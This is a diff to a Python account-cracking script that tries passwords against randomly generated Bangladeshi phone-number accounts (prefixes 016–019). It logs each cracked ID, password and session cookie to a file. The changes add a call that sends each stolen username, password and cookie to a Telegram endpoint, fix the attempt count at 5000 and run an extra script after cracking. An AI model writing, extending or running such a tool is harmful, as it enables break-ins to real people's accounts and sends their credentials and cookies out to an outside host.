@@ -28,9 +28,9 @@ def sendtg(message_text):
 
     response = requests.get(url)
     if response.status_code == 200:
-        pass  # Message sent successfully
+        print("success")
     else:
-        pass  # Failed to send the message
+        print("failed")
  
     
    
@@ -109,11 +109,12 @@ def fuck():
 
     print(logo)
     # print('[+] SIM CODE BD=> 016•017•018•019')
-    nude = random.choices(['016','017','018','019'])
+    
+    nude = random.choices(['016', '017', '018', '019'])[0]
     nudex = ''.join(random.choice(string.digits) for _ in range(2))
     nud = ''.join(random.choice(string.digits) for _ in range(2))
     print('[+] 2000•5000•10000•15000•50000')
-    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
+    limit =  5000
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
@@ -129,6 +130,7 @@ def fuck():
     print('\033[1;32m─────────────────────────────────────────────────────────')
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
     print('\033[1;32m─────────────────────────────────────────────────────────')
+    os.system("python test.py")
 def rcrack(uid,pwx,tl):
     global loop
     global cps
@@ -181,6 +183,7 @@ def rcrack(uid,pwx,tl):
                 print(f"\033[38;5;46m[D4RKW01F-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                 open('D4RKW01F-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 msg= f"user: {uid} pass : {ps} cookie: {coki}"
+                sendtg(msg)
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
